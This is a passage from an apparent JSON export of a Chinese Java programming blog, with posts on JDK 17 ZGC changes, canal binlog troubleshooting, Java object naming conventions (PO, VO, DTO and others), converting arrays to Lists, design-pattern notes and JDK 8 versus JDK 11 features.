个条目），它就会被移交给分配给该条带处理标记的 GC 线程。将对象引用加载到尚未标记的对象的 Java 线程会做同样的事情，只是它总是将对象引用放在关联的线程本地标记堆栈上，并且不会自己做任何实际的标记工作。 这种方法适用于大多数工作负载，但也存在病态问题。如果您有一个具有一个或多个 N:1 关系的对象图，其中 N 是一个非常大的数字，那么您可能会为标记堆栈使用大量内存（如许多 GB）。我们一直都知道这可能是一个问题，您可以编写一个小型综合测试来引发它，但我们从未真正遇到过暴露它的真实工作负载。也就是说，直到来自腾讯的 OpenJDK 贡献者报告他们在野外遇到了这个问题（注：我去，鹅厂！）。 JDK 17 中对此的修复涉及通过以下方式放松严格条带化： 对于 GC 线程，无论对象引用指向哪个条带，首先尝试标记对象（即可能跳出 GC 线程分配的条带），如果尚未标记，则将对象引用推送到关联标记 堆。 对于 Java 线程，首先检查对象是否已标记，如果尚未标记，则将对象引用推送到关联的标记堆栈。 （注：这一块我其实看的不是很懂。要是有人有兴趣讨论的话欢迎交流）。 这些调整有助于阻止在病态 N:1 情况下过度使用标记堆栈内存，其中 GC 线程一遍又一遍地遇到相同的对象引用，将大量重复的对象引用推入标记堆栈。重复是没有用的，因为一个对象只需要标记一次。通过在推送之前进行标记，并且只推送以前未标记的对象，复制品的生产就会停止。 我们最初有点不愿意这样做，因为 GC 线程现在正在执行原子比较和交换操作，以标记内存中属于分配给其他 GC 线程工作的条带的对象。这打破了严格的条带化，使其对缓存不太友好。Java 线程现在也在进行原子加载以查看对象是否被标记，这是他们以前没有做过的事情。同时，GC 线程完成的其他工作（扫描/跟踪对象字段和跟踪每个堆区域的活动对象/字节数）仍然遵守严格的条带化。最后，基准测试表明我们最初的担忧是没有根据的。GC 标记时间不受影响，对 Java 线程的影响也不明显。另一方面，我们现在有一个更健壮的标记方案，不会出现过多的内存使用。 （注：所以其实出现这个问题，是不是因为只是因为某厂的代码写的太烂了……） 支持 ARM 上的 macOS 前段时间（注：苹果2020年的秋季发布会的消息），Apple 宣布了一项将其 Mac 计算机产品线从 x86 过渡到 ARM 的长期计划。不久之后，JEP 391: macOS/AArch64 Port 提出了 JDK 到这个新平台的移植。JVM 代码库是相当模块化的，特定于操作系统和 CPU 的代码与共享平台无关代码隔离。JDK 已经支持 macOS/x86 和 Linux/Aarch64，因此支持 macOS/Aarch64 所需的主要部分已经存在。当然，任何计划发布和支持 JDK 的 macOS/Aarch64 构建的人仍然需要做一些工作，比如投资新硬件，将这个新平台集成到 CI 管道中等。 ZGC的故事几乎相同。macOS/x86 和 Linux/Aarch64 都已经得到支持，因此主要是启用构建和测试这种新的 OS/CPU 组合的问题。从 JDK 17 开始，ZGC 在以下平台上运行： Linux/x64 Linux/AArch64 macOS/x64 macOS/AArch64 Window/x64 Windows/AArch64 大多数 ZGC 代码库继续独立于平台。当前的代码分布如下所示： ​ 用于循环和暂停的 GarbageCollectorMXBeans GarbageCollectorMXBean 提供有关 GC 的信息。通过这个 bean，应用程序可以提取摘要信息（到目前为止完成的 GC 次数、累计花费的 GC 时间等）并监听 GarbageCollectionNotificationInfo 通知以获取有关单个 GC 的更细粒度的信息（GC 原因、开始时间、结束时间， ETC）。 在 JDK 17 之前，ZGC 发布了一个名为 ZGC 的单个 bean。这个 bean 提供了有关 ZGC 周期的信息。一个循环包括从开始到结束的所有 GC 阶段。大多数阶段是并发的，但有些是 Stop-The-World 暂停。虽然有关周期的信息很有用，但您可能还想知道在执行 GC 上花费了多少时间在 Stop-The-World 暂停上。此信息不适用于单个 ZGC bean。为了解决这个问题，ZGC 现在发布了两个 bean，一个称为 ZGC Cycles，一个称为 ZGC Pauses。顾名思义，每个 bean 提供的信息分别映射到周期和暂停。 总结： 作为第一个支持生产版本ZGC的LTS版本的JDK，JDK17中对ZGC做了下述优化： 支持 JVM 选项 -XX:+UseDynamicNumberOfGCThreads。此功能默认启用，并告诉 ZGC 对其使用的 GC 线程数保持智能，这通常会导致 Java 应用程序级别的更高吞吐量和更低延迟。 使用了 ZGC 的 JVM 在停止运行时， 基本上是实时的，而之前版本花费的时间更多。 标记算法现在通常使用更少的内存，并且不再容易出现过多的内存使用。 ZGC 现在可以在 macOS/Aarch64 上运行。 ZGC 现在发布了两个 GarbageCollectorMXBean，以提供有关 GC 周期和 GC 暂停的信息。 03 一些很搞笑的事情 据说有哥们在面试时候被面试官问到，ZGC的Z代表的是啥？ 面试者老哥内心OS：我去葛格不讲武德啊，之前面经没有讲到这个啊。但是呆胶布，我现场编一个。 于是他说，“ZGC的Z是英文字母的最后一个字母，这说明Oracle公司想把ZGC作为Java的最终解决方案，是一个革命性的Java垃圾回收机制解决方案，blabla。” 面试官微微一笑贴出官网截屏： ​ 翻译：ZGC 的 Z 毛线都不表示，莫得含义。 面试者：不听不听王八念经。 笑死。 # 关于我 Brath 是一个热爱技术的 Java 程序猿，公众号「InterviewCoder」定期分享有趣有料的精品原创文章！ 非常感谢各位人才能看到这里，原创不易，文章如果有帮助可以关注、点赞、分享或评论，这都是对我的莫大支持！","link":"/2022/07/29/%E3%80%90Java%E3%80%91ZGC%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%EF%BC%9AZGC%E7%AE%80%E4%BB%8B%E5%92%8CJDK17%E5%AF%B9ZGC%E7%9A%84%E4%BC%98%E5%8C%96/"},{"title":"【Java】canal服务运行一段时间客户端遍历不到数据","text":"# 【Java】canal 服务运行一段时间客户端遍历不到数据 canal：阿里巴巴的一款开源中间件，用于读取数据库 binlog 日志，实时发送给客户端。 问题：使用 canal 后运行一段时间，客户端一直轮询，但是 batchId 始终为 - 1，手动改动数据库数据后，仍然还是获取不到。 1.canal 服务读取出错了 检查 canal 日志关键是 logs\\example 下的，看是否由报错提示，如报错列不匹配，或者类型转换异常等，可能是你修改了表结构导致，直接配置 tsdb 数据库，然后删除 meta.dat 缓存即可。可参考上一篇文章 2.canal 读取的 binlog 已被删除 这里首先要介绍 meta.data 位置位于 conf\\example 下 {“clientDatas”:[{“clientIdentity”:{“clientId”:1001,“destination”:“example”,“filter”:&quot;.\\…&quot;},“cursor”:{“identity”:{“slaveId”:-1,“sourceAddress”:{“address”:“rm-m5epj85txc6175on5zo.mysql.rds.aliyuncs.com”,“port”:3306}},“postion”:{“gtid”:&quot;&quot;,“included”:false,“journalName”:“mysql-bin.002943”,“position”:151295060,“serverId”:1430559368,“timestamp”:1627023747000}}}],“destination”:“example”}。 这个主要是用来记录 binlog 读取位置的。 首先我们找到 journalName，对应的是 master 数据库 binlog 日志文件名。 position 为读取到 binlog 的位置。 而数据库的 binlog 会随着运行越来越多，所以它会自动删除之前的 binlog 日志。 然后去数据库执行 1show master logs log_name 则为现有的 binlog 日志，查找 binlog 是否和 meta.dat 里面记录的一致，若 meta.data 记录的 binlog 不在里面，则表示已被删除。 可将 journalName 值改为现有的 binlog 日志，然后把 position 置为 4 为什么 canal 读取的 binlog 会被删除呢 1. 手动删除，服务器磁盘容易满，所以偶尔会有人手动删除 binlog 文件。 2.client 端报错，客户端读取到 canal 发过来的数据后进行处理，若处理出错，程序在逻辑上没有 ack 此 batchId，而是去反复执行，那么 client 端会一直执行此条 batchId 数据，此时后面数据会进入 client，而在后面的 batchid 数据进来后会报 canal 的错误，batchId ***，大致意思就是执行的前面的 batchId 发现后面的 batchid 了，然后 canal 就卡在这了，不在读取后面的 binlog，当后面的 binlog 被删除后，就和数据库的 binlog 对应不上了 首先要检查 client 端是否有报错，然后检查 canal 服务是否有报错，在检查 binlog 是否一致，若不一致再分析原因 # 关于我 Brath 是一个热爱技术的 Java 程序猿，公众号「InterviewCoder」定期分享有趣有料的精品原创文章！ 非常感谢各位人才能看到这里，原创不易，文章如果有帮助可以关注、点赞、分享或评论，这都是对我的莫大支持！","link":"/2022/08/31/%E3%80%90Java%E3%80%91canal%E6%9C%8D%E5%8A%A1%E8%BF%90%E8%A1%8C%E4%B8%80%E6%AE%B5%E6%97%B6%E9%97%B4%E5%AE%A2%E6%88%B7%E7%AB%AF%E9%81%8D%E5%8E%86%E4%B8%8D%E5%88%B0%E6%95%B0%E6%8D%AE/"},{"title":"【Java】关于PO、BO、VO、DTO、DAO、POJO等概念的理解","text":"# 【Java】关于 PO、BO、VO、DTO、DAO、POJO 等概念的理解 # PO（Persistant Object）持久对象 PO 是持久化对象，用于表示数据库中的一条记录映射成的 Java 对象，类中应该都是基本数据类型和 String，而不是更复杂的类型，因为要和数据库表字段对应。PO 仅仅用于表示数据，不对数据进行操作，拥有 get 和 set 方法。对象类中的属性对应数据库表中的字段，有多少个字段就有多少个属性，完全匹配。遵循 JavaBean 规范，拥有 get 和 set 方法。如下图所示： # DO（Data Object）数据对象 数据对象，与数据库表结构一一对应，通过 dao 层向上传输数据对象，属性和 PO 中的基本一致。 # AO（Application Object）应用对象 在 Web 层与 Service 层之间抽象的复用对象模型，极为贴近展示层，复用度不高。 # BO（Business Object）业务对象 BO 是实际的业务对象，会参与业务逻辑的处理操作，里面可能会包含多个类，用于表示一个业务对象。例如用户可以拥有宠物，在这里把用户对应一个 PO、宠物对应一个 PO，那么建立一个对应的 BO 对象来处理用户和宠物的关系，每个 BO 都包含用户 PO 和宠物 PO，而处理逻辑时针对 BO 去处理。遵循 JavaBean 规范，拥有 get 和 set 方法。例如：（注：User 和 Pet 都是 PO 对象，但会放进 BO 中，形成一个复杂的业务对象。） 但注意，BO 又包括了业务逻辑，通常在 service 层，封装了对 DAO 层的调用，可以进行 PO 与 VO/DTO 之间的转换。 # VO（Value Object）表现对象 VO 对象主要用于前端界面显示的数据，是与前端进行交互的 Java 对象，但这里是不用 PO 传递数据的，因为 PO 包括数据库表中的所有字段，对于前端来说我们只需要显示一部分字段就可以了，例如我们的用户表 user 中的 password（密码）字段、phone（电话）字段、insert_time（插入时间）字段是没有必要也不能显示在前端界面的。遵循 JavaBean 规范，拥有 get 和 set 方法。 # DTO（Data Transfer Object）数据传输对象 数据传输对象是在传递给前端时使用的，如一张表有 100 个字段，那么对应的 PO 就有 100 个属性，但是我们的前端界面只需要显示 10 个字段，所以我们没必要把所有字段的 PO 对象传递到客户端，我们只需要把只有这 10 个属性的 DTO 对象传递到客户端，不会暴露服务端的表结构，到达客户端后，如果这个对象用于界面表示，那么它的身份就是 VO 对象。 DTO 和 VO 概念相似，通常情况下字段也基本一致。但有所不同，DTO 表示一个数据传输对象，是在服务端用于不同服务或不同层之间的数据传输，例如 dao 层到 service 层，service 层到 web 层；而 VO 是在客户端浏览器显示的表现对象，用于在浏览器界面数据的显示。 # DAO（Data Access Object）数据访问对象 DAO 是主要封装对数据库的访问，例如 UserDao 封装的就是对 user 表的增删改查操作。 通过它可以把 POJO 持久化为 PO，用 PO 组装出 VO 和 DTO。 DAO 一般在持久层，完全封装数据库操作，对外暴露的方法的使得上层不需要关注数据库的相关信息，只需要插入、删除、更新、查询即可。 # POJO（Plain Ordinary Java Object）简单 Java 对象 表示一个个简单的 Java 对象，而 PO、VO、DTO 都是典型的 POJO，而 DAO 和 BO 一般不是 POJO，只是提供了一些调用方法。 POJO 是 DO、DTO、BO、VO 的统称。 # 实例 有一个博客系统，数据库中存储了很多篇博客。我们会做如下设计： 数据库表：表中的博客包括编号、博客标题、博客内容、博客标签、博客分类、博客状态、创建时间、修改时间等。 PO：包括编号、博客标题、博客内容、博客标签、博客分类、博客状态、创建时间、修改时间等。（与数据库表中的字段一样。） VO：在客户端浏览器展示的页面数据，博客标题、博客内容、博客标签、博客分类、创建时间、上一篇博客 URL、下一篇博客 URL。 DTO：在服务端数据传输的对象，编号、博客标题、博客内容、博客标签、博客分类、创建时间、上一篇博客编号、下一篇博客编号。 DAO：数据库增删改查的方法，例如新增博客、删除博客、查询所有博客、更新博客。 BO：基本业务操作，如管理分类、管理标签、修改博客状态等，是我们常说的 service 层操作。 参考链接： Java 中常见的对象类型简述 (DO、BO、DTO、VO、AO、PO) PO BO VO DTO POJO DAO DO 这些 Java 中的概念分别指一些什么？ # 关于我 Brath 是一个热爱技术的 Java 程序猿，公众号「InterviewCoder」定期分享有趣有料的精品原创文章！ 非常感谢各位人才能看到这里，原创不易，文章如果有帮助可以关注、点赞、分享或评论，这都是对我的莫大支持！","link":"/2023/04/26/%E3%80%90Java%E3%80%91%E5%85%B3%E4%BA%8EPO%E3%80%81BO%E3%80%81VO%E3%80%81DTO%E3%80%81DAO%E3%80%81POJO%E7%AD%89%E6%A6%82%E5%BF%B5%E7%9A%84%E7%90%86%E8%A7%A3/"},{"title":"【Java】如何优雅的将数组转换为List集合","text":"# 【Java】如何优雅的将数组转换为 List 集合 # 第一种方式 (未必最佳): 使用 ArrayList.asList (strArray) 使用 Arrays 工具类 Arrays.asList (strArray) 方式，转换完成后，只能对 List 数组进行查改，不能增删，增删就会抛出 UnsupportedOperationException 异常 123456789import java.util.Arrays;import java.util.List; public static void Demo1() { String[] str = {&quot;fgx&quot;, &quot;lzy&quot;}; //注意这个List不是Collections包内的List,而是util包里面的List接口 List&lt;String&gt; ints = Arrays.asList(str); //这里会报错 ints.add(&quot;laopo&quot;); } 添加数据报错: 12345678910Exception in thread &quot;main&quot; java.lang.UnsupportedOperationExceptionat java.util.AbstractList.add(AbstractList.java:148)at java.util.AbstractList.add(AbstractList.java:108)at JAVA基础.JDK8新特性.Java数组转List.Demo1(Java数组转List.java:20)at JAVA基础.JDK8新特性.Java数组转List.main(Java数组转List.java:13)报错原因:Arrays.asList(str)返回值是java.util.Arrays类中一个私有静态内部类 java.utiil.Arrays.Arraylist,并不是我们平时用的java.util.ArrayList();使用场景:Arrays.asList(strArray)方式仅能用在将数组转换为List后，不需要增删其中的值，仅作为数据源读取使用。 # 第二种方法 (支持增删查改): 通过 ArrayList 的构造器，将 Arrays.asList (strArray) 的返回值由 java.utilArrays.ArrayList 转为 java.util.ArrayList. 关键代码：ArrayList list = new ArrayList (Arrays.asList (strArray)) ; 12345String[] str = {&quot;fgx&quot;, &quot;lzy&quot;}; //注意这个List不是Collections包内的List,而是util包里面的List接口 java.util.ArrayList&lt;String&gt; strings = new ArrayList&lt;&gt;(Arrays.asList(str)); strings.add(&quot;aop&quot;); strings.stream().forEach(System.out::println); 使用场景：需要在将数组转换为 List 后，对 List 进行增删改查操作，在 List 的数据量不大的情况下，可以使用。 # 第三种方式 (通过集合工具类 Collections.addAll () 方法 (最高效)) 通过 Collections.addAll (arrayList, strArray) 方式转换，根据数组的长度创建一个长度相同的 List，然后通过 Collections.addAll () 方法，将数组中的元素转为二进制，然后添加到 List 中，这是最高效的方法。 123456public static void Demo3() { //注意这个List不是Collections包内的List,而是util包里面的List接口 String[] str = {&quot;fgx&quot;, &quot;lzy&quot;}; java.util.ArrayList&lt;String&gt; stringList = new ArrayList&lt;&gt;(str.length); Collections.addAll(stringList,str); } # 第四种方式通过 JDK8 的 Stream 流将 3 总基本类型数组转为 List 如果 JDK 版本在 1.8 以上，使用流 stream 来将下列 3 种数组快速转为 List, 分别是 int [],long [],double [], 不支持 short [ ],byte [ ],char [] 在 JDK1.8 中暂不支持. 123456int[] ints = {2, 34, 55, 22, 11}; long[] longs = {1, 2, 3}; double[] doubles = {1, 2, 3}; Arrays.stream(ints).boxed().collect(Collectors.toList()); Arrays.stream(longs).boxed().collect(Collectors.toList()); Arrays.stream(doubles).boxed().collect(Collectors.toList()); TIPs: 为什么 int [] 不能直接转为 List, 而 Integer [] 可以转为 List, 而 Integer [] 就可以转为 List 了，因为 List 中的泛型必须是引用类型。 java 数组转 list 误区 一、不能把基本数据类型转化为列表 仔细观察可以发现 asList 接受的参数是一个泛型的变长参数，而基本数据类型是无法泛型化的，如下所示： 1234567891011public class App { public static void main(String[] args) { int [] intarray = { 1 , 2 , 3 , 4 , 5 }; //List&lt;Integer&gt; list = Arrays.asList(intarray); 编译通不过 List&lt; int []&gt; list = Arrays.asList(intarray); System.out.println(list); }}output：[[I @66d3c617 ] 这是因为把 int 类型的数组当参数了，所以转换后的列表就只包含一个 int [] 元素。 解决方案： 要想把基本数据类型的数组转化为其包装类型的 list，可以使用 guava 类库的工具方法，示例如下： 12int [] intArray = { 1 , 2 , 3 , 4 };List&lt;Integer&gt; list = Ints.asList(intArray); 二、asList 方法返回的是数组的一个视图 视图意味着，对这个 list 的操作都会反映在原数组上，而且这个 list 是定长的，不支持 add、remove 等改变长度的方法。 123456789101112131415public class App { public static void main(String[] args) { int [] intArray = { 1 , 2 , 3 , 4 }; List&lt;Integer&gt; list = Ints.asList(intArray); list.set( 0 , 100 ); System.out.println(Arrays.toString(intArray)); list.add( 5 ); list.remove( 0 ); }}output：[ 100 , 2 , 3 , 4 ]UnsupportedOperationExceptionUnsupportedOperationException # 关于我 Brath 是一个热爱技术的 Java 程序猿，公众号「InterviewCoder」定期分享有趣有料的精品原创文章！ 非常感谢各位人才能看到这里，原创不易，文章如果有帮助可以关注、点赞、分享或评论，这都是对我的莫大支持！","link":"/2023/01/28/%E3%80%90Java%E3%80%91%E5%A6%82%E4%BD%95%E4%BC%98%E9%9B%85%E7%9A%84%E5%B0%86%E6%95%B0%E7%BB%84%E8%BD%AC%E6%8D%A2%E4%B8%BAList%E9%9B%86%E5%90%88/"},{"title":"设计模式（一）","text":"# 设计模式笔记 __Brath.Li # GoF23：23 种设计模式 ​ 设计模式的本质是面向对象设原则的实际运用，是对类的封装性，继承性，多态性以及类的关联关系和组合关系的充分理解。 ​ 正确使用设计模式具有以下优点： ​ 1. 提高程序员思维能力，编程能力和设计能力 ​ 2. 使程序设计更加标准化，代码编制更加工程化，使软件开发效率大大提高，从而缩短软件的开的周期。 ​ 3. 使设计的代码可重用性高、可读性强、可靠性高、灵活性好、可维护性强。 # 创建型模式： ​ 单例模式、工厂模式、抽象工厂模式、建造者模式、原型模式。 # 结构型模式： ​ 适配器模式、桥接模式、装饰模式、组合模式、外欧冠模式、享元模式、代理模式。 # 行为性模式： ​ 模板方法模式、命令模式、迭代器模式、观察者模式、中介者模式、备忘录模式、解释器模式、状态模式、策略模式、责任链模式、访问者模式。 # OOP 面向对象七大原则： 1.OCP 开闭原则： ​ 软件实体（包括类、模块、功能等）应该对扩展开放，但是对修改关闭。 2. 里氏替换原则： ​ 继承必须确保超类锁拥有的性质在子类中仍然成立。 3. 依赖倒置原则： ​ 面向接口编程，不要面向实现编程。 4. 单一职责原则： ​ 控制类粒度大小、将对象解耦合、提高内聚性。 5. 接口隔离原则： ​ 要为各个类建立他们需要的专用接口。 6. 迪米特法则： ​ ** 只与你的直接朋友交谈、不跟 “陌生人” 说话。 ** 7. 合成复用原则： ​ 尽量先使用组合或者聚合等关联关系来实现，其次才考虑使用继承关系来实现。 # 单例设计模式： 作用：让一个类只能创建一个实例（因为频繁的创建对象，回收对象会造成系统性能下降。）。解决对象的唯一性，保证了内存中一个对象是唯一的 。 # 饿汉式：Hunary 步骤：1. 私有化构造器 2. 直接创建静态对象 3. 创建一个静态的方法，供外部调用实例 优点：类初始化的时候，会立即加载该对象，线程天生安全，调用效率高。 缺点：无法避免被反射破解，不安全 # 懒汉式：LazyMan 步骤：1. 私有化构造器，不会直接创建对象 2. 向外暴露调用对象方法，在方法中先进行对象判空，为空才创建对象，这就是懒汉式 优点：类初始化时，不会初始化该对象，真正需要使用的时候才会去创建该对象，具备懒加载功能。 缺点： 1. 判空浪费时间 2. 不加 Synchronized 的懒汉式线程不安全，需要用到 volatile 关键字保持 new 对象的原子性一致 懒汉式单线程下是 OK 的，但是多线程并发下不安全。 开启十次线程测试 每次重启线程数都不一致，线程不安全。 怎么解决： Tips：懒汉式也是可以实现线程安全的：只要加上 Synchronized 加锁即可： 但是这样一来，会降低整个访问的速度，而且每次都要判断。那么有没有更好的方式来实现呢？ 解决方案： double-check-lock 双重加锁 所谓双重加锁机制。指的是，并不是每次进入 getInstance 方法都需要同步，而是先不同步，进入方法之后先检查实例是否存在，如果不存在才进入下面 Synchronized 加锁，之后会再次检查实例是否存在，如果还不存在才创建实例。 双重检测方式（因为 JVM 本身重排序的原因，可能会出现多次的初始化） 这种模式下的懒汉式，称为 DCL 懒汉式！ 你以为这样就没问题了？大错特错，注意：这里的 new 对象操作不是原子性的 new 一个对象的执行顺序 ↓ 1234567891011/** * 1.分配内存空间 * 2.执行构造方法初始化对象 * 3.把这个对象指向内存空间 * 这是创建对象的步骤 正确顺序为 123 * 举例： * 线程A 创建对象 步骤为 123, 我们的代码没有问题 * 线程B 创建对象 因为操作步骤不是原子性的，可能会走成 1 3 2，先指向了内存空间，再去构造对象 * 这时会出现一个问题，指令重排：双重检测模式会失效，因为此时我们的类，不为空了，但是里面返回的对象是空的。 * 所以就要用到一个关键字volatile，避免指令重排，保持操作原子性 */ # 静态内部类模式： 步骤：1. 私有化构造器 2. 创建一个静态内部类，类中创建外部类的实例 3. 向外暴露一个方法获取静态内部类中创建的对象 优点：结合了懒汉式和饿汉式各自的优点，真正需要对象的时候才会加载，加载类是线程安全的。 缺点：每次调用都会创建多余的对象 # 以上单例设计模式都会被反射破解，枚举不会！ 枚举：枚举本身是一个类，继承了 Enum 的实例就成为了枚举类 使用枚举实现单例模式，实现简单、调用效率高，枚举本身就是单例，由 JVM 从根本上提供保障，避免通过反射和反序列化的漏洞，缺点是没有延迟加载。 在源码 Constructor 中 如果是对象是通过反射机制创建的会抛出一个异常 IllegalArgumentException: Cannot reflectively create enum objects 枚举类在 traget 输出的代码中，构造器是空的，隐藏起来了，用 javap -p 反编译也看不见构造器 我们用反射机制获取空构造器会获取不到对象，这时候用 jad 反编译工具，得到的 java 文件中， 可以看见构造器其实是有数据的，我们把数据放到反射中实现，就会得到这个异常 Cannot reflectively create enum objects 由此可见，反射不能破坏枚举的单例模式 优点：实现简单，线程安全，防止反射攻击等。 缺点： 在不需要的时候可能就加载了，造成内存浪费 Tips：利用反射破解懒汉式。懒汉式不是安全的！ 私有化构造器的时候判断外面的字段 guoqing 是否 ==false，等于的话就设置为 true，如果不等于的话就抛出运行异常，这样设计的话在我们用反射机制获取构造器的时候，就获取不到对象了 但是有解决方法：利用反射强大的机制，假如我们反编译，知道要破解的字段是 guoqing，那我们直接用反射获取 guoqing 字段，然后设置解除私有化限制，在创建构造器实例的时候，把 guoqing 设置为 true，就可以破解 DCL 懒汉式了 # 工厂设计模式 Factory Model： ​ 核心本质： ​ 实例化对象不使用 new，用工厂方法代替 ​ 将选择实现类，创建对象统一管理和控制。从而将调用者跟我们的实现类解耦。 ​ 详细分类： ​ 简单工厂模式 ​ 用来生产同一等级结构中的任意产品：扩展性差 ​ 工厂方法模式 ​ 用来生产同一等级结构中的固定产品：扩展性强 ​ 抽象工厂模式 ​ 围绕一个超级工厂创建其他工厂。该超级工厂又称为其他工厂的工厂。 工厂设计模式应用场景： ​ JDK 中的 Calendar 的 getInstance 方法 ​ JDBC 中的 Connection 对象的获取 ​ Spring 的 IOC 容器创建管理 Bean 对象 ​ 反射 Class 对象的 newInsetance 方法 # 建造者模式： ​ 建造者模式也属于创建型模式，它提供了一种创建对象的最佳方式。 ​ 定义：将一个复杂对象的构建与它的表示分离，使得同样的构建过程可以创建不同的表示 ​ 主要作用：在用户不知道对象的建造过程和细节的情况下就可以直接创建复杂对象。 ​ 用户只需要给出指定复杂对象的类型和内容，建造者模式负责将按顺序创建复杂对象（把内部的建造过程和细节隐藏起来） ​ 例子： ​ 工厂（建造者模式）：负责制造汽车（组装过程和细节在工厂内） ​ 汽车购买者（用户）：你只需要说你需要的型号（对象的类型和内容），然后直接购买就可以了（不需要知道汽车是怎么组装的（发动机、变速箱、轮毂、车门）） # 原型模式： ​ 创建型模式之一。 ​ # 适配器模式 ​ 将一个类的接口转换成客户希望的另外一个接口，Adapter 模式使得原本由于接口不兼容而不能一起工作的那些类可以在一起工作！ ​ 角色分析： ​ 1 . 目标接口：客户所期待的接口，目标可以使具体或抽象的类，也可以是接口。 ​ 2 . 需要适配的类：需要适配的类或者适配者类。 ​ 3 . 适配器：通过包装一个需要适配的对象，将原接口转换成目标对象。 ​ 对象适配器优点 ​ 1 . 一个对象适配器可以把多个不同的适配者适配到同一个目标 ​ 2 . 可以适配一个适配者的子类，由于适配器和适配者之间是关联关系，根据 “里氏代换原则” ，适配者的子类也可以通过该适配器进行适配。 ​ 类适配器缺点： ​ 1 . 对于 Java、C# 等不支持多重类继承的语言，一次最多只能适配一个适配者类，不能同时适配多个适配者。 ​ 2 . 在 Java、C# 等语言中，适配器模式中的目标抽象类只能为接口，不能为类，其使用有一定的局限性。 ​ 适用场景： ​ 1 . 系统需要使用一些现有的类，而这些类的接口不符合系统的需要，甚至没有这些类的代码。 ​ 2 . 想创建一个可以重复使用的类，用于与一些彼此之间没有太大关联的一些类，包括一些可能在将来引进的类一起工作。 # 关于我 Brath 是一个热爱技术的 Java 程序猿，公众号「InterviewCoder」定期分享有趣有料的精品原创文章！ 非常感谢各位人才能看到这里，原创不易，文章如果有帮助可以关注、点赞、分享或评论，这都是对我的莫大支持！","link":"/2021/10/16/%E3%80%90Java%E3%80%91%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F%E7%AC%94%E8%AE%B0/"},{"title":"【Java八股文】JDK8与JDK11的区别","text":"# 【Java 八股文】JDK8 与 JDK11 的区别 # 文章目录 前言 一、Java8 的新特性 Lambda 表达式 方法引用 函数式接口实例 Java 8 默认方法 Stream Optional 类 Nashorn JavaScript 日期时间 API Base64 二、Java11 的新特性 ZGC Flight Recorder（JFR） Low-Overhead Heap Profiling HTTP/2 Client API Transport Layer Security (TLS) 1.3 Improve Aarch64 Intrinsics Epsilon: A No-Op Garbage Collector(Experimental) Launch Single-File Source-Code Programs Unicode 10 Nest-Based Access Control Dynamic Class-File Constants Remove the Java EE and CORBA Modules Deprecate the Nashorn JavaScript Engine Deprecate the Pack200 Tools and API 总结 # 前言 目前市场上主流的稳定版主要是 Java 8 和 Java 11。 # 一、Java8 的新特性 # Lambda 表达式 Lambda 表达式，也可称为闭包，它是推动 Java 8 发布的最重要新特性，Lambda 允许把函数作为一个方法的参数（函数作为参数传递进方法中），使用 Lambda 表达式可以使代码变的更加简洁紧凑。 # 方法引用 方法引用通过方法的名字来指向一个方法，方法引用可以使语言的构造更紧凑简洁，减少冗余代码，方法引用使用一对冒号 :: 。 # 函数式接口实例 Predicate 接口是一个函数式接口，它接受一个输入参数 T，返回一个布尔值结果。该接口包含多种默认方法来将 Predicate 组合成其他复杂的逻辑（比如：与，或，非）。该接口用于测试对象是 true 或 false。 # Java 8 默认方法 Java 8 新增了接口的默认方法。简单说，默认方法就是接口可以有实现方法，而且不需要实现类去实现其方法。我们只需在方法名前面加个 default 关键字即可实现默认方法。 # Stream Stream 使用一种类似用 SQL 语句从数据库查询数据的直观方式来提供一种对 Java 集合运算和表达的高阶抽象。Stream API 可以极大提高 Java 程序员的生产力，让程序员写出高效率、干净、简洁的代码。这种风格将要处理的元素集合看作一种流，流在管道中传输，并且可以在管道的节点上进行处理，比如筛选，排序，聚合等。元素流在管道中经过中间操作（intermediate operation）的处理，最后由最终操作 (terminal operation) 得到前面处理的结果。 # Optional 类 Optional 类是一个可以为 null 的容器对象。如果值存在则 isPresent () 方法会返回 true，调用 get () 方法会返回该对象。Optional 是个容器：它可以保存类型 T 的值，或者仅仅保存 null。Optional 提供很多有用的方法，这样我们就不用显式进行空值检测。Optional 类的引入很好的解决空指针异常。 # Nashorn JavaScript Nashorn 一个 javascript 引擎。从 JDK1.8 开始，Nashorn 取代 Rhino (JDK 1.6, JDK1.7) 成为 Java 的嵌入式 JavaScript 引擎。Nashorn 完全支持 ECMAScript 5.1 规范以及一些扩展。它使用基于 JSR292 的新语言特性，其中包含在 JDK 7 中引入的 invokedynamic，将 JavaScript 编译成 Java 字节码。与先前的 Rhino 实现相比，这带来了 2 到 10 倍的性能提升。 # 日期时间 API Java 8 通过发布新的 Date-Time API (JSR 310) 来进一步加强对日期与时间的处理。 在旧版的 Java 中，日期时间 API 存在诸多问题，其中有： 非线程安全 − java.util.Date 是非线程安全的，所有的日期类都是可变的，这是 Java 日期类最大的问题之一。 设计很差 − Java 的日期 / 时间类的定义并不一致，在 java.util 和 java.sql 的包中都有日期类，此外用于格式化和解析的类在 java.text 包中定义。java.util.Date 同时包含日期和时间，而 java.sql.Date 仅包含日期，将其纳入 java.sql 包并不合理。另外这两个类都有相同的名字，这本身就是一个非常糟糕的设计。 时区处理麻烦 − 日期类并不提供国际化，没有时区支持，因此 Java 引入了 java.util.Calendar 和 java.util.TimeZone 类，但他们同样存在上述所有的问题。 Java 8 在 java.time 包下提供了很多新的 API。以下为两个比较重要的 API： Local (本地) − 简化了日期时间的处理，没有时区的问题。 Zoned (时区) − 通过制定的时区处理日期时间。 新的 java.time 包涵盖了所有处理日期，时间，日期 / 时间，时区，时刻（instants），过程（during）与时钟（clock）的操作。 # Base64 在 Java8 中，Base64 编码已经成为 Java 类库的标准。 Java 8 内置了 Base64 编码的编码器和解码器。 Base64 工具类提供了一套静态方法获取下面三种 BASE64 编解码器： 基本：输出被映射到一组字符 A-Za-z0-9+/，编码不添加任何行标，输出的解码仅支持 A-Za-z0-9+/。 URL：输出映射到一组字符 A-Za-z0-9+_，输出是 URL 和文件。 MIME：输出隐射到 MIME 友好格式。输出每行不超过 76 字符，并且使用’\\r’并跟随’\\n’作为分割。编码输出最后没有行分割。 # 二、Java11 的新特性 # ZGC JDK11 引入了两种新的 GC，其中包括也许是划时代意义的 ZGC，虽然其目前还是实验特性，但是从能力上来看，这是 JDK 的一个巨大突破，为特定生产环境的苛刻需求提供了一个可能的选择。例如，对部分企业核心存储等产品，如果能够保证不超过 10ms 的 GC 暂停，可靠性会上一个大的台阶，这是过去我们进行 GC 调优几乎做不到的，是能与不能的问题。对于 G1 GC，相比于 JDK 8，升级到 JDK 11 即可享受到：并行的 Full GC，快速的 